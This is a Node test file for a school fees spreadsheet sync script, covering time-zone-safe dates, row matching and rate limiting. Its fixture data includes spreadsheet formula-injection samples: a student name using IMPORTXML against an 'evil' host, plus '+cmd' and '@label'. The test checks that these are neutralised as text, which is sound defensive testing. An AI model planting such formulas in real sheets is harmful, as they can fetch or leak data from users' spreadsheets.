/** node tests/fees-sheet-sync.test.mjs: runs tools/fees-sheet-sync.gs unchanged in a mocked Apps Script runtime. */
import assert from 'node:assert/strict'; import fs from 'node:fs'; import vm from 'node:vm'; import path from 'node:path'; import { fileURLToPath } from 'node:url';
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const GS = fs.readFileSync(path.join(root, 'tools/fees-sheet-sync.gs'), 'utf8');
function offsetMin(date, tz) { const p = Object.fromEntries(new Intl.DateTimeFormat('en-US', { timeZone: tz, hourCycle: 'h23', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).formatToParts(date).map((x) => [x.type, x.value])); return (Date.UTC(+p.year, p.month - 1, +p.day, +p.hour, +p.minute, +p.second) - date.getTime()) / 60000; }
const fmt = (d, tz) => new Intl.DateTimeFormat('en-CA', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit' }).format(d);
const SF = ['Enrollment ID', 'Student', 'Course', 'Registered', 'Status', 'Total Fee', 'Discount', 'Paid', 'Balance', 'Payment Status', 'Next Due Date', 'Notes'];
const PY = ['Date', 'Enrollment ID', 'Student', 'Installment #', 'Amount', 'Method', 'Invoice No', 'Proof', 'Notes'];
function run(tz, { feed, students, payments, runs = 1 }) {
  const writes = [], ctx = {};
  vm.createContext(ctx); const CDate = vm.runInContext('Date', ctx);
  const midnight = (y, m, d) => { let t = Date.UTC(y, m - 1, d); for (let i = 0; i < 3; i++) t = Date.UTC(y, m - 1, d) - offsetMin(new Date(t), tz) * 60000; return new CDate(t); };
  const tab = (name, grid) => ({ getName: () => name, grid, getLastRow: () => grid.length, getLastColumn: () => grid[0].length,
    getRange: (r, c, nr = 1, nc = 1) => ({
      getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => { const v = grid[r - 1 + i]?.[c - 1 + j] ?? ''; return typeof v === 'string' && v.startsWith('=') ? (grid[r - 1 + i][0] === '' && grid[r - 1 + i][1] === '' ? '' : 1) : v; })),
      getFormulas: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => { const v = grid[r - 1 + i]?.[c - 1 + j] ?? ''; return typeof v === 'string' && v.startsWith('=') ? v : ''; })),
      getA1Notation: () => String.fromCharCode(64 + c) + r,
      setValue(v) { while (grid.length < r) grid.push(Array(grid[0].length).fill('')); assert.ok(!(typeof grid[r - 1][c - 1] === 'string' && grid[r - 1][c - 1].startsWith('=')), 'never overwrites a formula'); assert.ok(!(typeof v === 'string' && /^[=+\-@]/.test(v)), 'never writes formula-like text raw: ' + v); grid[r - 1][c - 1] = typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v; /* Sheets drops the leading ' when reading */ writes.push([name, String.fromCharCode(64 + c) + r, v && v.getTime ? fmt(v, tz) : v]); },
      setRichTextValue(rt) { grid[r - 1][c - 1] = rt.text; writes.push([name, String.fromCharCode(64 + c) + r, 'LINK ' + rt.url]); } }) });
  const real = (g) => g.map((row) => row.map((v) => v && v.ymd ? midnight(...v.ymd) : v));
  const tabs = { 'Students & Fees': tab('Students & Fees', real(students)), Payments: tab('Payments', real(payments)) };
  let cachePuts = 0, syncs = 0; const cache = {};
  Object.assign(ctx, { console: { log() {} },
    SpreadsheetApp: { openById: () => ({ getSpreadsheetTimeZone: () => tz, getSheetByName: (n) => tabs[n] }), newRichTextValue: () => { const o = {}; const b = { setText(t) { o.text = t; return b; }, setLinkUrl(u) { o.url = u; return b; }, build: () => o }; return b; } },
    Utilities: { parseDate: (s, z, f) => { assert.equal(z, tz); assert.equal(f, 'yyyy-MM-dd'); const [y, m, d] = s.split('-').map(Number); return midnight(y, m, d); }, formatDate: (d, z) => { assert.equal(z, tz); return fmt(d, tz); } },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    CacheService: { getScriptCache: () => ({ get: (k) => cache[k] || null, put: (k, v) => { cachePuts++; cache[k] = v; } }) },
    ContentService: { createTextOutput: (s) => s }, call_: () => { syncs++; return feed; }, RESPONSES_SHEET_ID: 'x', midnight });
  vm.runInContext(GS + '\nFEES_SYNC_REGISTRATION = false;', ctx);
  const per = []; for (let i = 0; i < runs; i++) { const n = writes.length; ctx.syncFees(); per.push(writes.length - n); }
  return { writes, per, ctx, tabs, stats: () => ({ cachePuts, syncs }), midnight };
}
const F = (n) => '=F' + n;
const feed = { rows: [
  { student_id: 'DFA-2026-0004', name: 'Sikandar', email: 'a@x', course: 'A1 + A2', registered: '2026-11-05', status: 'active', fee_total: 40000, next_due_date: '2026-12-28', payments: [{ invoice_no: 'INV-2026-0004', installment_no: 1, date: '2026-11-05', amount: 10000, method: '', label: '', voided: false, revision: 0, proof_url: '' }] },
  { student_id: 'DFA-2026-0014', name: '=IMPORTXML("http://evil","//a")', email: 'b@x', course: '+cmd', registered: '2026-11-23', status: 'active', fee_total: 25000, next_due_date: '2026-12-31', payments: [{ invoice_no: 'INV-2026-0014', installment_no: 1, date: '2026-11-23', amount: 7, method: 'bank', label: '@label', voided: false, revision: 1, proof_url: 'https://drive.google.com/open?id=abc' }] },
  { student_id: 'DFA-2026-0001', name: 'Test', payments: [{ invoice_no: 'INV-2026-0001', installment_no: 1, date: '2026-10-26', amount: 1, voided: false }] }] };
for (const tz of ['Asia/Karachi', 'America/Los_Angeles', 'Pacific/Kiritimati']) {
  // staff-entered dates are midnight in the sheet's own zone
  const st = [SF, ['DFA-2026-0004', 'Muhammad Sikandar', 'A1 + A2', null, 'Active', 40000, 0, F(1), F(2), F(3), null, 'my note'], ['', '', '', '', '', '', '', F(1), F(2), F(3), '', 'keep me'], ['', '', '', '', '', '', '', F(1), F(2), F(3), '', '']];
  const py = [PY, [null, 'DFA-2026-0004', F(1), 1, 10000, '', 'INV-2026-0004', '=HYPERLINK("u","View proof")', 'manual'], ['', '', F(1), '', '', '', '', '', '']];
  st[1][3] = { ymd: [2026, 11, 5] }; st[1][10] = { ymd: [2026, 12, 28] }; py[1][0] = { ymd: [2026, 11, 5] };
  const t = run(tz, { feed, students: st, payments: py, runs: 2 });
  const W = Object.fromEntries(t.writes.map((w) => [w[0] + '!' + w[1], w[2]]));
  assert.equal(t.per[1], 0, tz + ': second run writes nothing (no day shift, no rewrite loop)');
  assert.ok(!('Students & Fees!D2' in W) && !('Students & Fees!K2' in W) && !('Payments!A2' in W), tz + ': matching dates are not rewritten');
  assert.ok(!('Students & Fees!B2' in W), 'staff-tidied name is kept');
  assert.ok(!Object.keys(W).some((k) => /Students & Fees!A3|Students & Fees!L3/.test(k)), 'row with a note is not treated as empty');
  assert.equal(W['Students & Fees!A4'], 'DFA-2026-0014', 'new student goes into the first completely empty row');
  assert.equal(W['Students & Fees!B4'], `'=IMPORTXML("http://evil","//a")`, 'formula-like name is written as text');
  assert.equal(W['Students & Fees!C4'], "'+cmd");
  assert.equal(W['Students & Fees!K4'], '2026-12-31', tz + ': due date written as the same calendar day');
  assert.equal(W['Payments!G3'], 'INV-2026-0014'); assert.equal(W['Payments!A3'], '2026-11-23');
  assert.equal(W['Payments!H3'], 'LINK https://drive.google.com/open?id=abc', 'proof is a link, not a formula');
  assert.equal(W['Payments!I3'], "'@label · Revised receipt");
  assert.ok(!Object.keys(W).some((k) => k.startsWith('Payments!') && W[k] === 'INV-2026-0004'), 'manual payment with invoice is matched, not duplicated');
  assert.ok(!Object.values(W).includes('DFA-2026-0001'), 'test entries are skipped');
  assert.ok(!Object.keys(W).some((k) => /!(H|I|J)\d/.test(k) && k.startsWith('Students')), 'formula columns untouched');
}
// a manual Payments row without an invoice number blocks new payment rows (no double counting)
{
  const t = run('Asia/Karachi', { feed, students: [SF], payments: [PY, ['x', 'DFA-2026-0014', F(1), 1, 7, '', '', '', 'typed by hand'], ['', '', F(1), '', '', '', '', '', '']] });
  assert.ok(!t.writes.some((w) => w[0] === 'Payments'), 'no payment rows added while a manual row has no invoice');
  const rec = t.ctx.reconcile_(t.ctx.SpreadsheetApp.openById(), feed.rows);
  assert.equal(rec.unmatched, 1); assert.ok(rec.lines[0].includes('has no Invoice No'));
}
// web app ping: at most one sync a minute, always "ok"
{
  const t = run('Asia/Karachi', { feed, students: [SF], payments: [PY], runs: 0 });
  assert.equal(t.ctx.doPost(), 'ok'); assert.equal(t.ctx.doPost(), 'ok');
  assert.equal(t.stats().syncs, 1, 'second ping within 60s is skipped');
  const t2 = run('Asia/Karachi', { feed: null, students: [SF], payments: [PY], runs: 0 });
  t2.ctx.call_ = () => { throw new Error('website down'); };
  assert.equal(t2.ctx.doPost(), 'ok', 'errors never reach the caller');
}
assert.ok(!/HYPERLINK\(/.test(GS.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '')), 'the script never writes a formula');
console.log('fees-sheet-sync.test.mjs: OK');
